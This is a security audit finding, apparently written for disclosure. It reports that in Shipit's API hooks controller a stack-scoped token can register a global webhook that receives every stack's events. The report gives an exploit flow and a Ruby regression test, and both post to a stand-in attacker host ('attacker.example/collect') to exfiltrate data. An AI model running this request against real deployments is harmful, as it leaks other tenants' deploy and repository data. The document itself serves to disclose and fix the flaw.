### Title
Stack-scoped API token can create an instance-wide (global) `Hook` receiving all tenants' events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController#stack_id` determines the target `Hook#stack_id` purely from whether `params[:stack_id]` is present in the request, never from `current_api_client.stack_id`. A stack-scoped API token (one whose `ApiClient#stack_id` restricts it to stack A) with only `write:hook` permission can `POST /api/hooks` (the top-level route, which the test suite confirms takes priority over the nested `stacks/:stack_id/hooks` route) and, by simply omitting `stack_id` from the body, create a `Hook` with `stack_id: nil` — a global hook that `Hook.for_stack` matches for every stack.

### Finding Description
The intended binding is: for a scoped `ApiClient` where `current_api_client.stack_id?` is true, every `Hook` it creates must satisfy `hook.stack_id == current_api_client.stack_id` (or the request must be rejected). Instead: [1](#0-0) 

`hooks` is `Hook.where(stack_id:)` and the private `stack_id` method returns `stack.id if params[:stack_id].present?` — i.e. `nil` whenever the request body/params omit `stack_id`, regardless of what stack the authenticated `ApiClient` is scoped to. Crucially, the `stack` helper (which does enforce `current_api_client`'s restriction via `stacks.from_param!`) is only invoked when `params[:stack_id]` is present: [2](#0-1) 

so the one place that consults `current_api_client.stack_id` is skipped entirely on the no-param path. `require_permission :write, :hook` only checks the permission list, not stack ownership: [3](#0-2) 

There is no other check anywhere in `create` that a stack-scoped client is prevented from writing `stack_id: nil`. On the delivery side, `Hook.for_stack` explicitly includes global hooks for every stack's events: [4](#0-3) 

Exploit flow: attacker holds a token for an `ApiClient` with `stack_id = A` and `permissions = ['write:hook']`. They send `POST /api/hooks` with `{delivery_url: "https://attacker.example/collect", events: [...]}` and no `stack_id`. `stack_id` (controller method) evaluates to `nil`, `hooks.create(params)` inserts `Hook.new(stack_id: nil, ...)`. From then on, every call to `Hook.emit`/`Hook.deliver` for **any** stack (B, C, …) matches this hook via `for_stack(stack_id)` (`where(stack_id: [nil, stack_id])`) and its payload (commit/deploy/task metadata) is POSTed to the attacker's `delivery_url`.

### Impact Explanation
The attacker exfiltrates event payloads (deploy, task, commit_status, merge, pull_request, etc.) from stacks/repositories they were never granted access to, using only a token scoped to one stack. This is a cross-tenant confidentiality breach: a credential meant to be confined to stack A gains an ongoing, repeatable read channel over every other stack's webhook events, delivered to an attacker-controlled URL. This matches the "exfiltration ... across tenants" / cross-tenant data leak category described as Critical impact.

### Likelihood Explanation
Preconditions are modest: the attacker needs a legitimately-issued API token that is scoped to a single stack and carries only the `write:hook` permission (a normal, low-privilege grant an operator might hand out for stack-specific webhook management). No GitHub secrets, session, or elevated role is required — only the scoped token itself. The request is a single unauthenticated-in-Shipit-terms API call (`POST /api/hooks` with Basic Auth using the token) and is fully repeatable/persistent (the hook stays registered until deleted).

### Recommendation
In `Shipit::Api::HooksController`, derive `stack_id` from `current_api_client.stack_id` when the client is scoped, instead of trusting `params[:stack_id].present?` alone: if `current_api_client.stack_id?`, force `stack_id` to `current_api_client.stack_id` (ignoring/validating any client-supplied value); only allow `stack_id: nil` (global hook) creation for unscoped/unlimited clients.

### Proof of Concept
```ruby
# test/controllers/api/hooks_controller_test.rb
test "#create with a stack-scoped token cannot register a global hook" do
  scoped_client = ApiClient.create!(
    creator: shipit_users(:walrus),
    name: 'scoped',
    stack: @stack,
    permissions: ['write:hook']
  )
  authenticate_as(scoped_client) # helper wrapping Basic Auth with scoped_client token

  assert_no_difference -> { Hook.global.count } do
    post :create, params: { delivery_url: 'https://attacker.example/collect', events: %w[deploy] }
  end

  hook = Hook.order(:id).last
  assert_equal @stack.id, hook.stack_id, "hook created by a stack-scoped token must be bound to that stack, not global"
end
```
Before the fix, this assertion fails because `hook.stack_id` is `nil` even though `scoped_client.stack_id == @stack.id`, confirming the broken binding `hook.stack_id == current_api_client.stack_id`.
